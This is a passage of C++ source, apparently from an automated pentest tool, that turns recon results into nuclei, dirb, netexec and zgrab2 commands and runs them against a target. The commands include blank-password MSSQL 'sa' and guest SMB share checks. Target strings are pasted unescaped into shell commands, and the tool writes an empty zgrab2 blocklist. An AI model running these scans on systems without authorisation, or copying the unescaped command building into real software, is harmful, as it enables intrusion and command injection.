    {"Redis Commander",ProtoFamily::proto_db_nosql,  "DBConsole",    "redis"},
    {"RabbitMQ",       ProtoFamily::proto_message_bus,"MessageBus",  "rabbitmq"},
    {"Kafka",          ProtoFamily::proto_message_bus,"MessageBus",  "kafka"},

    // --- Object storage (S3-like) --------------------------------------------
    {"Amazon S3",      ProtoFamily::proto_fileshare, "ObjectStorage","s3"},
    {"AWS S3",         ProtoFamily::proto_fileshare, "ObjectStorage","s3"},
    {"MinIO",          ProtoFamily::proto_fileshare, "ObjectStorage","minio"},
    {"Wasabi",         ProtoFamily::proto_fileshare, "ObjectStorage","s3"},
    {"DigitalOcean Spaces", ProtoFamily::proto_fileshare,"ObjectStorage","s3"},
    {"Backblaze B2",   ProtoFamily::proto_fileshare, "ObjectStorage","s3"},
    {"Google Cloud Storage", ProtoFamily::proto_fileshare,"ObjectStorage","gcs"},
    {"Azure Blob Storage", ProtoFamily::proto_fileshare,"ObjectStorage","azure-blob"},

    // --- VPN SSL --------------------------------------------------------------
    {"Fortinet SSL VPN", ProtoFamily::proto_vpn_tunnel, "VPN",       "fortinet"},
    {"FortiGate SSL VPN",ProtoFamily::proto_vpn_tunnel, "VPN",       "fortinet"},
    {"Pulse Secure",   ProtoFamily::proto_vpn_tunnel,   "VPN",       "pulse-secure"},
    {"GlobalProtect",  ProtoFamily::proto_vpn_tunnel,   "VPN",       "globalprotect"},
};

// Parse recon_httpx.txt
static void collect_from_httpx(const fs::path& httpx_file,
                               std::vector<ReconEvidence>& out_evidence)
{
    std::ifstream ifs(httpx_file);
    if (!ifs.is_open()) return;

    std::string line;
    while (std::getline(ifs, line)) {
        if (line.empty()) continue;
        std::string lower = to_lower_copy(line);

        // URL = premier token
        std::string url;
        {
            size_t sp = line.find(' ');
            if (sp != std::string::npos) url = line.substr(0, sp);
            else url = line;
        }

        for (const auto& sig : kWebTechSignatures) {
            if (!sig.keyword || !*sig.keyword) continue;
            std::string key = sig.keyword;
            std::string key_l = to_lower_copy(key);
            if (lower.find(key_l) != std::string::npos) {
                ReconEvidence ev;
                ev.key       = key;
                ev.source    = "httpx";
                ev.location  = url;
                ev.severity  = "";
                ev.raw       = line;
                out_evidence.push_back(std::move(ev));
            }
        }
    }
}

// Parse recon_nuclei.txt – récupère CVE / template + sévérité + TAGS (nouveau)
static void collect_from_nuclei(const fs::path& nuclei_file,
                                std::vector<ReconEvidence>& out_evidence)
{
    std::ifstream ifs(nuclei_file);
    if (!ifs.is_open()) return;

    std::string line;
    std::regex bracket_re(R"(\[([^\]]+)\])");
    while (std::getline(ifs, line)) {
        if (line.empty()) continue;

        std::smatch m;
        std::vector<std::string> parts;
        std::string::const_iterator searchStart(line.cbegin());
        while (std::regex_search(searchStart, line.cend(), m, bracket_re)) {
            parts.push_back(m[1].str());
            searchStart = m.suffix().first;
        }

        // URL = premier token
        std::string url = line;
        size_t sp = line.find(' ');
        if (sp != std::string::npos) url = line.substr(0, sp);

        // Parts attendues (forme standard nuclei):
        // [0] template-id, [1] severity, [2] tags (csv)
        std::string template_id;
        std::string tags_str;
        std::string cve;
        std::string sev;

        if (!parts.empty()) {
            template_id = parts[0];
        }
        for (const auto& p : parts) {
            std::string pl = to_lower_copy(p);
            if (pl.rfind("cve-", 0) == 0) cve = p;
            if (pl == "low" || pl == "medium" || pl == "high" || pl == "critical")
                sev = pl;
        }
        if (parts.size() >= 3) {
            tags_str = parts.back();
        }

        // Evidence principale (comme avant): CVE ou template-id
        if (!cve.empty() || !template_id.empty()) {
            ReconEvidence ev;
            ev.key      = !cve.empty() ? cve : template_id;
            ev.source   = "nuclei";
            ev.location = url;
            ev.severity = sev;
            ev.raw      = line;
            out_evidence.push_back(std::move(ev));
        }

        // Nouvelles evidences: chaque TAG devient une evidence "nuclei-tag"
        if (!tags_str.empty()) {
            std::stringstream ss(tags_str);
            std::string tag;
            while (std::getline(ss, tag, ',')) {
                std::string tl = to_lower_copy(tag);
                if (tl.empty()) continue;
                ReconEvidence ev_tag;
                ev_tag.key      = tl;              // ex: wordpress, jenkins, panel, default-login, misconfig, ...
                ev_tag.source   = "nuclei-tag";
                ev_tag.location = url;
                ev_tag.severity = sev;
                ev_tag.raw      = line;
                out_evidence.push_back(std::move(ev_tag));
            }
        }
    }
}

// Parse recon_whatweb.json (output JSON de whatweb -a 3 --log-json)
static void collect_from_whatweb(const fs::path& ww_json,
                                 std::vector<ReconEvidence>& out_evidence)
{
    if (!fs::exists(ww_json)) return;

    try {
        std::ifstream ifs(ww_json);
        if (!ifs.is_open()) return;
        std::stringstream buffer;
        buffer << ifs.rdbuf();
        std::string txt = buffer.str();
        if (txt.empty()) return;
        json j = json::parse(txt, nullptr, false);
        if (j.is_discarded()) return;

        // Format typique : [{ "target": "https://x", "plugins": { "WordPress": [...], ... }}, ...]
        if (j.is_array()) {
            for (const auto& item : j) {
                std::string url = item.value("target", "");
                if (!item.contains("plugins") || !item["plugins"].is_object()) continue;
                for (auto it = item["plugins"].begin(); it != item["plugins"].end(); ++it) {
                    std::string pluginName = it.key();
                    ReconEvidence ev;
                    ev.key      = pluginName;
                    ev.source   = "whatweb";
                    ev.location = url;
                    ev.severity = "";
                    ev.raw      = pluginName;
                    out_evidence.push_back(std::move(ev));
                }
            }
        }
    } catch (...) {
    }
}

// Parse recon_wafw00f.txt – détecte WAF/CDN (Cloudflare, F5, Akamai, etc.)
static void collect_from_wafw00f(const fs::path& waf_file,
                                 std::vector<ReconEvidence>& out_evidence)
{
    std::ifstream ifs(waf_file);
    if (!ifs.is_open()) return;

    std::string line;
    std::string last_host;
    while (std::getline(ifs, line)) {
        if (line.empty()) continue;
        std::string lower = to_lower_copy(line);
        if (lower.rfind("http", 0) == 0) {
            last_host = line;
            continue;
        }
        if (lower.find("is behind") != std::string::npos) {
            ReconEvidence ev;
            ev.key      = line;
            ev.source   = "wafw00f";
            ev.location = last_host;
            ev.severity = "info";
            ev.raw      = line;
            out_evidence.push_back(std::move(ev));
        }
    }
}

// Agrégation globale
static std::vector<ReconEvidence> collect_web_evidence(const fs::path& workdir)
{
    std::vector<ReconEvidence> ev;
    collect_from_httpx(workdir / "recon_httpx.txt", ev);
    collect_from_nuclei(workdir / "recon_nuclei.txt", ev);
    collect_from_whatweb(workdir / "recon_whatweb.json", ev);
    collect_from_wafw00f(workdir / "recon_wafw00f.txt", ev);
    return ev;
}

static void add_unique_cmd(std::vector<ConfirmationCommand>& cmds,
                           const ConfirmationCommand& cmd)
{
    for (const auto& c : cmds) {
        if (c.id == cmd.id) return;
    }
    cmds.push_back(cmd);
}

// Retourne la TechSignature correspondant à une evidence.key
// (pour les sources httpx/whatweb, key == sig.keyword)
static const TechSignature* find_signature_by_keyword(const std::string& key) {
    for (const auto& sig : kWebTechSignatures) {
        if (sig.keyword && key == sig.keyword) {
            return &sig;
        }
    }
    return nullptr;
}

// Match "loose" : d'abord keyword exact, puis présence du tag dans nuclei_tags
static const TechSignature* find_signature_loose(const std::string& key_lc) {
    // 1) match exact sur keyword
    for (const auto& sig : kWebTechSignatures) {
        if (!sig.keyword) continue;
        std::string kw = to_lower_copy(sig.keyword);
        if (kw == key_lc) return &sig;
    }
    // 2) match sur nuclei_tags (csv)
    for (const auto& sig : kWebTechSignatures) {
        if (!sig.nuclei_tags) continue;
        std::string tags = to_lower_copy(sig.nuclei_tags);
        std::stringstream ss(tags);
        std::string t;
        while (std::getline(ss, t, ',')) {
            if (t == key_lc) return &sig;
        }
    }
    return nullptr;
}

static std::vector<ConfirmationCommand>
build_web_confirmation_plan(const std::string& baseurl,
                            const fs::path& workdir,
                            const std::vector<ReconEvidence>& evidence)
{
    std::vector<ConfirmationCommand> plan;
    if (evidence.empty()) return plan;

    // ---------------- Sévérité Nuclei (politique interne, pas d'ENV) --------
    const std::string& sev_targeted = nuclei_severity_targeted();

    // ========== BASELINE: NUCLEI FULL PAR DÉFAUT (toujours) ==================
    {
        ConfirmationCommand c;
        c.id = "baseline_nuclei_full_targeted";
        c.description = "Baseline: Nuclei full (sans tags) à sévérité " + sev_targeted + ".";
        fs::path out = workdir / "baseline_nuclei_full.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl + "'"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }
    // ========================================================================

    // --- Flags globaux (inchangés) ------------------------------------------
    bool has_high_or_crit_vuln = false;
    bool has_cms        = false;
    bool has_ci_cd      = false;
    bool has_k8s        = false;
    bool has_registry   = false;
    bool has_db_console = false;
    bool has_iam        = false;

    // --- Nouveaux flags stacks / services spécifiques -----------------------
    bool has_node_stack    = false;
    bool has_go_stack      = false;
    bool has_rails_stack   = false;
    bool has_public_s3     = false;
    bool has_redis_console = false;
    bool has_mongo_console = false;
    bool has_graphql       = false;
    bool has_swagger       = false;

    // ------------------------------------------------------------------------
    // Phase 1 : derive tous les flags à partir des evidence + kWebTechSignatures
    // ------------------------------------------------------------------------
    bool has_medium_vuln = false;

    // On collectera aussi des tags "tech" agrégés pour un flow générique
    std::set<std::string> aggregated_tech_tags;

    for (const auto& ev : evidence) {
        // 1) Nuclei : flags de vuln globales
        if (ev.source == "nuclei") {
            if (ev.severity == "critical" || ev.severity == "high")
                has_high_or_crit_vuln = true;
            if (ev.severity == "medium")
                has_medium_vuln = true;
        }

        // 2) Matching techno/signature
        const TechSignature* sig = nullptr;
        if (ev.source == "httpx" || ev.source == "whatweb") {
            sig = find_signature_by_keyword(ev.key); // strict (nom techno)
        } else if (ev.source == "nuclei-tag") {
            // match "loose" par tag nuclei (ex: wordpress, jenkins, panel, default-login, ...)
            sig = find_signature_loose(to_lower_copy(ev.key));
        }

        if (!sig) {
            // ex: CVE, WAF raw strings, etc. non mappés aux signatures
            continue;
        }

        const std::string cat = sig->category ? sig->category : "";
        const std::string key = sig->keyword  ? sig->keyword  : "";

        // Agrégation des tags Nuclei portés par la signature (si présents)
        if (sig->nuclei_tags && *sig->nuclei_tags) {
            std::stringstream ss(sig->nuclei_tags);
            std::string t;
            while (std::getline(ss, t, ',')) {
                std::string tl = to_lower_copy(t);
                if (!tl.empty()) aggregated_tech_tags.insert(tl);
            }
        }

        // --- Catégories fonctionnelles --------------------------------------
        if (cat == "CMS" || cat == "ECommerce") {
            has_cms = true;
        }
        if (cat == "CI/CD" || cat == "SCM") {
            has_ci_cd = true;
        }
        if (cat == "Registry") {
            has_registry = true;
        }
        if (cat == "K8s") {
            has_k8s = true;
        }
        if (cat == "DBConsole") {
            has_db_console = true;

            // Raffinements : consoles Redis / Mongo spécifiques
            if (key.find("Redis Commander") != std::string::npos) {
                has_redis_console = true;
            }
            if (key.find("Mongo Express") != std::string::npos) {
                has_mongo_console = true;
            }
        }
        if (cat == "IAM") {
            has_iam = true;
        }

        // --- Stacks / runtimes backend --------------------------------------
        if (cat == "NodeJS") {
            has_node_stack = true;
        }
        if (cat == "Go") {
            has_go_stack = true;
        }
        if (cat == "Ruby") {
            has_rails_stack = true;
        }

        // --- Detections transverses -----------------------------------------
        if (cat == "API") {
            has_graphql = has_graphql || (to_lower_copy(key).find("graphql") != std::string::npos);
        }
        if (cat == "APIConsole") {
            // Swagger/OpenAPI
            const std::string kl = to_lower_copy(key);
            has_swagger = has_swagger || (kl.find("swagger") != std::string::npos)
                                       || (kl.find("openapi") != std::string::npos);
        }
        if (cat == "ObjectStorage") {
            has_public_s3 = true;
        }
    }

    // ------------------------------------------------------------------------
    // Phase 2 : génération du plan de commandes de confirmation (flows ciblés)
    // ------------------------------------------------------------------------

    if (has_cms) {
        ConfirmationCommand c;
        c.id = "confirm_cms_nuclei";
        c.description = "Validation ciblée CMS (WordPress / Joomla / Drupal / Magento / PrestaShop) via nuclei.";
        fs::path out = workdir / "confirm_cms_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags wordpress,joomla,drupal,magento,prestashop,woocommerce"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_ci_cd) {
        ConfirmationCommand c;
        c.id = "confirm_cicd_panels";
        c.description = "Validation d'exposition de consoles CI/CD (Jenkins, GitLab, GitHub, ...) via nuclei.";
        fs::path out = workdir / "confirm_cicd_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -templates exposed-panels/jenkins/ exposed-panels/gitlab/ exposed-panels/github/"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_k8s) {
        ConfirmationCommand c;
        c.id = "confirm_k8s_panels";
        c.description = "Validation d'exposition de Kubernetes Dashboard / Rancher / OpenShift / Portainer via nuclei.";
        fs::path out = workdir / "confirm_k8s_panels.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags kubernetes,k8s,rancher,openshift,portainer"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_registry) {
        ConfirmationCommand c;
        c.id = "confirm_registries";
        c.description = "Validation d'exposition de registries (Nexus, Artifactory, Harbor, Docker Registry).";
        fs::path out = workdir / "confirm_registries_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags nexus,harbor,artifactory,docker-registry"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_db_console) {
        ConfirmationCommand c;
        c.id = "confirm_db_consoles";
        c.description = "Validation de consoles DB (phpMyAdmin / Adminer) exposées via nuclei.";
        fs::path out = workdir / "confirm_db_console_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags phpmyadmin,adminer"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_iam) {
        ConfirmationCommand c;
        c.id = "confirm_iam_exposed";
        c.description = "Validation d'exposition de portails IAM (Keycloak / Auth0 / Okta / Azure AD) via nuclei.";
        fs::path out = workdir / "confirm_iam_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags keycloak,oidc,saml,oauth,login"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_high_or_crit_vuln) {
        ConfirmationCommand c;
        c.id = "confirm_high_criticals";
        c.description = "Relance nuclei sur la cible avec severities high/critical uniquement pour confirmation.";
        fs::path out = workdir / "confirm_high_critical_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -severity high,critical"
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_node_stack) {
        ConfirmationCommand c;
        c.id = "confirm_node_stack_nuclei";
        c.description = "Validation Node.js / Express / Next.js (debug, fichiers sensibles, vuln connues) via nuclei.";
        fs::path out = workdir / "confirm_node_stack_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags nodejs,express,nextjs,nestjs,api,exposure,config"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_go_stack) {
        ConfirmationCommand c;
        c.id = "confirm_go_stack_nuclei";
        c.description = "Validation des stacks Go (Gin/Echo/Fiber/Beego) via nuclei (API exposées, panels, etc.).";
        fs::path out = workdir / "confirm_go_stack_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags go,golang,api,exposure"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_rails_stack) {
        ConfirmationCommand c;
        c.id = "confirm_rails_stack_nuclei";
        c.description = "Validation ciblée Ruby on Rails (RCE historiques, debug, secrets) via nuclei.";
        fs::path out = workdir / "confirm_rails_stack_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags rails,ruby"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_public_s3) {
        ConfirmationCommand c;
        c.id = "confirm_object_storage_public";
        c.description = "Validation d'exposition de buckets S3-like (AWS S3 / MinIO / Spaces / B2) via nuclei.";
        fs::path out = workdir / "confirm_object_storage_public.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags s3,bucket,object-storage,minio"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_redis_console) {
        ConfirmationCommand c;
        c.id = "confirm_redis_console_exposed";
        c.description = "Validation d'exposition d'une console Redis (Redis Commander) via nuclei.";
        fs::path out = workdir / "confirm_redis_console_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags redis,redis-commander,exposed-panel"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_mongo_console) {
        ConfirmationCommand c;
        c.id = "confirm_mongo_console_exposed";
        c.description = "Validation d'exposition de Mongo Express / consoles MongoDB via nuclei.";
        fs::path out = workdir / "confirm_mongo_console_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags mongodb,mongo-express,exposed-panel"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_graphql) {
        ConfirmationCommand c;
        c.id = "confirm_graphql_introspection";
        c.description = "Vérifie si l'endpoint GraphQL autorise l'introspection / schémas sensibles via nuclei.";
        fs::path out = workdir / "confirm_graphql_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags graphql"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    if (has_swagger) {
        ConfirmationCommand c;
        c.id = "confirm_swagger_openapi_exposed";
        c.description = "Validation d'exposition de Swagger UI / OpenAPI publics via nuclei.";
        fs::path out = workdir / "confirm_swagger_openapi_nuclei.txt";
        c.outfile = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags swagger,openapi,api-docs"
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    // ------------------------------------------------------------------------
    // Flow générique : agrège tous les tags nuclei issus des stacks détectées
    // ------------------------------------------------------------------------
    if (!aggregated_tech_tags.empty()) {
        std::string joined;
        bool first = true;
        for (const auto &t : aggregated_tech_tags) {
            if (!first) joined += ",";
            joined += t;
            first = false;
        }

        ConfirmationCommand c;
        c.id          = "confirm_techstack_nuclei";
        c.description = "Validation générique basée sur les tags nuclei agrégés depuis les stacks détectées.";
        fs::path out  = workdir / "confirm_techstack_nuclei.txt";
        c.outfile     = out;
        c.command =
            "nuclei -u '" + baseurl +
            "' -tags " + joined +
            " -severity " + sev_targeted +
            " -silent -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    return plan;
}


static void execute_confirmation_plan(const std::vector<ConfirmationCommand>& plan,
                                      const fs::path& workdir,
                                      std::vector<fs::path>& produced_files)
{
    if (plan.empty()) {
        loginfo(std::string(ansi::sky) + "[AI] Aucun scenario de validation genere (plan vide)." + ansi::reset);
        return;
    }

    print_header_box("Phase 2 - Validation / Confirmation (IA symbolique)");
    size_t idx = 0;
    for (const auto& cmd : plan) {
        ++idx;
        std::ostringstream title;
        title << "Rule #" << idx << " - " << cmd.id;
        print_header_box(title.str());
        std::vector<std::pair<std::string,std::string>> rows = {
            {"Description", cmd.description},
            {"Commande",    cmd.command},
            {"Output file", cmd.outfile.string()}
        };
        print_kv_table(rows, {"Description", "Commande", "Output file"});

        std::string so, se;
        loginfo(std::string(ansi::yellow) + "[AI] Execution de la commande de confirmation..." + ansi::reset);
        bool ok = run_command_capture(cmd.command, so, se, 0, false);

        fs::path out = cmd.outfile.empty()
            ? (workdir / (cmd.id + "_result.txt"))
            : cmd.outfile;

        try {
            fs::create_directories(out.parent_path());
            std::ofstream ofs(out, std::ios::binary);
            ofs << "# ID       : " << cmd.id << "\n";
            ofs << "# DESC     : " << cmd.description << "\n";
            ofs << "# COMMAND  : " << cmd.command << "\n";
            ofs << "# SUCCESS  : " << (ok ? "true" : "false") << "\n\n";
            if (!so.empty()) ofs << "STDOUT:\n" << so << "\n\n";
            if (!se.empty()) ofs << "STDERR:\n" << se << "\n";
        } catch (...) {
        }
        produced_files.push_back(out);
    }

    loginfo(std::string(ansi::green) + "[AI] Phase de validation Web terminee." + ansi::reset);
}

static void run_web_validation_phase(const std::string& baseurl,
                                     const fs::path& workdir,
                                     std::vector<fs::path>& produced_files)
{
    loginfo(std::string(ansi::sky) + "[AI] Phase 2 Web: analyse des resultats de recon et prise de decision symbolique..." + ansi::reset);

    auto evidence = collect_web_evidence(workdir);

    // Affiche un récap minimal, même si evidence vide
    {
        std::unordered_set<std::string> uniq_keys;
        for (const auto& ev : evidence) uniq_keys.insert(ev.key);
        std::ostringstream keys;
        bool first = true;
        for (const auto& k : uniq_keys) { if (!first) keys << ", "; keys << k; first = false; }

        std::vector<std::pair<std::string,std::string>> rows = {
            {"Evidence sources", "httpx / nuclei / whatweb / wafw00f"},
            {"Distinct keys",    keys.str()}
        };
        print_kv_table(rows, {"Evidence sources", "Distinct keys"});
    }

    // 1) Plan basé sur les evidences (signatures/heuristiques)
    auto plan = build_web_confirmation_plan(baseurl, workdir, evidence);

    // 2) Si plan vide -> flows génériques automatiques (Nuclei full + Dirb agressif)
    if (plan.empty()) {
        loginfo(std::string(ansi::sky) + "[AI] Aucun scenario de validation genere (plan vide) -> fallback generique." + ansi::reset);

        const std::string& sev_fb = nuclei_severity_fallback(); // "critical,high,medium,low"

        // Fallback 1 : Nuclei full (toutes templates visibles par défaut + filtre de sévérité interne)
        {
            ConfirmationCommand c;
            c.id = "fallback_nuclei_full";
            c.description = "Fallback generique: Nuclei full (toutes templates accessibles) avec severite etendue.";
            fs::path out = workdir / "fallback_nuclei_full.txt";
            c.outfile = out;
            c.command =
                "nuclei -u '" + baseurl + "'"
                " -severity " + sev_fb +
                " -silent -o '" + out.string() + "'";
            add_unique_cmd(plan, c);
        }

        // Fallback 2 : Dirb agressif (découverte de répertoires)
        {
            ConfirmationCommand c;
            c.id = "fallback_dirb_aggressive";
            c.description = "Fallback generique: Dirb agressif (wordlist commune).";
            fs::path out = workdir / "fallback_dirb_common.txt";
            c.outfile = out;
            c.command =
                "dirb '" + baseurl + "' /usr/share/wordlists/dirb/common.txt -r -S 2>&1 | tee '" + out.string() + "'";
            add_unique_cmd(plan, c);
        }

        // (Optionnel) Fallback 3 : Fuzz basique (décommente si tu as ffuf/gobuster)
        // {
        //     ConfirmationCommand c;
        //     c.id = "fallback_basic_fuzz";
        //     c.description = "Fallback generique: fuzz HTTP basique (si outil dispo).";
        //     fs::path out = workdir / "fallback_fuzz_basic.txt";
        //     c.outfile = out;
        //     c.command = "ffuf -u '" + baseurl + "/FUZZ' -w /usr/share/wordlists/dirb/common.txt -ac -of md -o '" + out.string() + "'";
        //     add_unique_cmd(plan, c);
        // }
    }

    // 3) Exécution du plan (evidence-based ou fallback)
    execute_confirmation_plan(plan, workdir, produced_files);
}

// -----------------------------------------------------------------------------
// Phase 2 : IA symbolique pour la validation infra post-naabu
// -----------------------------------------------------------------------------

static void run_infra_validation_phase(const std::string& host,
                                       const std::vector<int>& open_ports,
                                       const fs::path& workdir,
                                       std::vector<fs::path>& produced_files)
{
    loginfo(std::string(ansi::sky) +
            "[AI] Phase 2 Infra: prise de décision symbolique à partir des ports ouverts..." +
            ansi::reset);

    auto has_port = [&](int p)->bool {
        return std::find(open_ports.begin(), open_ports.end(), p) != open_ports.end();
    };

    std::vector<ConfirmationCommand> plan;

    // SMB exposé (445) -> test de partages accessibles en invité
    if (has_port(445)) {
        ConfirmationCommand c;
        c.id = "confirm_smb_guest_shares";
        c.description = "Vérifie si des partages SMB sont accessibles en guest/anonyme (netexec smb).";
        fs::path out = workdir / "confirm_smb_guest_shares.txt";
        c.outfile = out;
        c.command =
            "netexec smb " + host + " -u 'guest' -p '' --shares";
        add_unique_cmd(plan, c);
    }

    // MSSQL exposé (1433) -> test très basique 'sa' sans mot de passe
    if (has_port(1433)) {
        ConfirmationCommand c;
        c.id = "confirm_mssql_sa_blank";
        c.description = "Teste si le compte MSSQL 'sa' a un mot de passe vide (faible sécurité).";
        fs::path out = workdir / "confirm_mssql_sa_blank.txt";
        c.outfile = out;
        c.command =
            "netexec mssql " + host + " -u 'sa' -p ''";
        add_unique_cmd(plan, c);
    }

    // RDP exposé (3389) -> vérifie bannières / options NLA via netexec rdp --info
    if (has_port(3389)) {
        ConfirmationCommand c;
        c.id = "confirm_rdp_nla";
        c.description = "Récupère les infos RDP (NLA, domaine, etc.) via netexec rdp --info.";
        fs::path out = workdir / "confirm_rdp_info.txt";
        c.outfile = out;
        c.command =
            "netexec rdp " + host + " --info";
        add_unique_cmd(plan, c);
    }

    // Redis (6379) -> zgrab2 redis : instance ouverte / pas d'auth ?
    if (has_port(6379)) {
        ConfirmationCommand c;
        c.id = "confirm_redis_unauth";
        c.description = "Vérifie si Redis est accessible / potentiellement sans authentification (zgrab2 redis).";
        fs::path out = workdir / "confirm_redis_zgrab2.json";
        c.outfile = out;
        c.command =
            "echo '" + host +
            "' | zgrab2 redis --port 6379 --output-file '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    // MongoDB (27017) -> zgrab2 mongodb
    if (has_port(27017)) {
        ConfirmationCommand c;
        c.id = "confirm_mongodb_unauth";
        c.description = "Vérifie si MongoDB est ouvert / sans auth (zgrab2 mongodb).";
        fs::path out = workdir / "confirm_mongodb_zgrab2.json";
        c.outfile = out;
        c.command =
            "echo '" + host +
            "' | zgrab2 mongodb --port 27017 --output-file '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    // MySQL (3306) -> zgrab2 mysql
    if (has_port(3306)) {
        ConfirmationCommand c;
        c.id = "confirm_mysql_exposed";
        c.description = "Récupère la bannière MySQL / infos de version via zgrab2 mysql.";
        fs::path out = workdir / "confirm_mysql_zgrab2.json";
        c.outfile = out;
        c.command =
            "echo '" + host +
            "' | zgrab2 mysql --port 3306 --output-file '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    // PostgreSQL (5432) -> zgrab2 postgres
    if (has_port(5432)) {
        ConfirmationCommand c;
        c.id = "confirm_postgres_exposed";
        c.description = "Récupère la bannière PostgreSQL via zgrab2 postgres.";
        fs::path out = workdir / "confirm_postgres_zgrab2.json";
        c.outfile = out;
        c.command =
            "echo '" + host +
            "' | zgrab2 postgres --port 5432 --output-file '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    // HTTP sur ports non standard (8080, 8443, 9443, 8000) -> httpx + nuclei ciblé
    bool has_alt_http = has_port(8080) || has_port(8443) || has_port(9443) || has_port(8000);
    if (has_alt_http) {
        ConfirmationCommand c;
        c.id = "confirm_alt_http_services";
        c.description = "Scan HTTP(s) sur ports applicatifs alternatifs (8080/8443/9443/8000) via httpx+nuclei.";
        fs::path out = workdir / "confirm_alt_http_nuclei.txt";
        c.outfile = out;
        c.command =
            "printf '" + host + ":8080\\n" + host + ":8443\\n" + host + ":9443\\n" + host + ":8000\\n'"
            " | httpx -silent -title -status-code -tech-detect"
            " | nuclei -silent -severity critical,high,medium"
            " -o '" + out.string() + "'";
        add_unique_cmd(plan, c);
    }

    execute_confirmation_plan(plan, workdir, produced_files);
}

// -----------------------------------------------------------------------------
// Helpers post-naabu : parsing des ports ouverts
// -----------------------------------------------------------------------------
static std::string trim_copy(std::string s) {
    auto not_space = [](int ch){ return !std::isspace(ch); };
    s.erase(s.begin(), std::find_if(s.begin(), s.end(), not_space));
    s.erase(std::find_if(s.rbegin(), s.rend(), not_space).base(), s.end());
    return s;
}

static std::set<int> parse_naabu_ports(const fs::path& naabu_file) {
    std::set<int> ports;
    std::ifstream ifs(naabu_file);
    if (!ifs.is_open()) return ports;

    std::string line;
    while (std::getline(ifs, line)) {
        line = trim_copy(line);
        if (line.empty()) continue;

        // Forme la plus fréquente: host:port ou ip:port
        std::string portStr;
        size_t colon = line.rfind(':');
        if (colon != std::string::npos && colon + 1 < line.size()) {
            portStr = line.substr(colon + 1);
        } else {
            // fallback: peut-être que naabu n'a sorti que le port (peu probable)
            portStr = line;
        }

        try {
            int p = std::stoi(portStr);
            if (p > 0 && p <= 65535) ports.insert(p);
        } catch(...) {
            // ignore lignes cheloues
        }
    }
    return ports;
}

// -----------------------------------------------------------------------------
// zgrab2: s'assure que ~/.config/zgrab2/blocklist.conf existe
// -----------------------------------------------------------------------------
static void ensure_zgrab2_blocklist()
{
    const char* home = std::getenv("HOME");
    if (!home || !*home) {
        // sur Windows ou cas particulier, on laisse zgrab2 gérer
        return;
    }

    try {
        fs::path cfg_dir = fs::path(home) / ".config" / "zgrab2";
        fs::create_directories(cfg_dir);

        fs::path blocklist = cfg_dir / "blocklist.conf";
        if (!fs::exists(blocklist)) {
            std::ofstream ofs(blocklist, std::ios::binary);
            ofs << "# auto-generated by AgentFactory\n";
            ofs << "# empty blocklist (no IP ranges blocked)\n";
        }
    } catch (...) {
        // best-effort : si on ne peut pas créer, on laisse zgrab2 gérer (et éventuellement râler)
    }
}

// -----------------------------------------------------------------------------
// Post-naabu enrichment: NetExec + Impacket si ports intéressants ouverts
// -----------------------------------------------------------------------------
static void run_post_naabu_enrichment(const std::string& host,
                                      const fs::path& workdir,
                                      const std::set<int>& ports,
                                      std::vector<fs::path>& produced_files)
{
    auto write_out = [&](const fs::path& outpath, const std::string& content){
        try {
            fs::create_directories(outpath.parent_path());
